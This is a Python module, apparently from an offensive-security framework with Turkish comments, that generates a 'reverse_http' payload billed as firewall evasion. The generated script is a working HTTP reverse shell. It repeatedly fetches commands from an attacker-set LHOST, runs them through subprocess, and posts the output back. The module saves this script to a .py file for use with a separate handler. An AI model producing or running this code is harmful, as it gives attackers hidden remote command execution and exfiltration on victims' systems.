from core.module import BaseModule
from core.option import Option
from typing import Dict, Any

class Payload(BaseModule):
    Name = "mahpreter/reverse_http"
    Description = "Reverse HTTP Payload (Firewall Evasion)."
    Author = "Mahmut P."
    Category = "payloads"

    def __init__(self):
        super().__init__()
        self.Options = {
            "LHOST": Option("LHOST", "127.0.0.1", True, "Bağlanılacak Sunucu/IP."),
            "LPORT": Option("LPORT", 80, True, "Bağlanılacak Port (HTTP)."),
            "OUTPUT": Option("OUTPUT", "", False, "Payload'ı dosyaya kaydet.", completion_dir=".")
        }

    def generate(self) -> str:
        lhost = self.get_option_value("LHOST")
        lport = self.get_option_value("LPORT")

        # Python HTTP Reverse Shell (urllib based for minimal deps)
        payload = f"""
import urllib.request, subprocess, time, os, sys

SERVER_URL = "http://{lhost}:{lport}"
ID = os.getpid()

def connect():
    while True:
        try:
            req = urllib.request.Request(f"{{SERVER_URL}}/connect/{{ID}}")
            resp = urllib.request.urlopen(req)
            cmd = resp.read().decode("utf-8")
            
            if cmd == "terminate":
                break
            
            if cmd:
                output = subprocess.getoutput(cmd)
                # Send output via POST
                req_post = urllib.request.Request(f"{{SERVER_URL}}/output/{{ID}}", data=output.encode("utf-8"), method="POST")
                urllib.request.urlopen(req_post)
            else:
                time.sleep(1) # Boş cevap, bekle
        except:
            time.sleep(5)

if __name__ == "__main__":
    connect()
"""
        return payload.strip()

    def run(self, options: Dict[str, Any]):
        code = self.generate()
        
        output_path = self.get_option_value("OUTPUT")
        if output_path:
            if not output_path.endswith(".py"):
                output_path += ".py"

            try:
                with open(output_path, "w") as f:
                    f.write(code)
                print(f"[*] Payload başarıyla kaydedildi: {output_path}")
                return f"Payload saved to {output_path}"
            except Exception as e:
                print(f"[!] Dosya yazma hatası: {e}")
                return code

        print(f"[*] Mahpreter (HTTP) Payload oluşturuldu ({len(code)} bytes):")
        # print(code) # Çok uzun olabilir, ekrana basmıyoruz
        print("[!] Not: 'server.py' handler'ını başlatmayı unutmayın.")
        return code
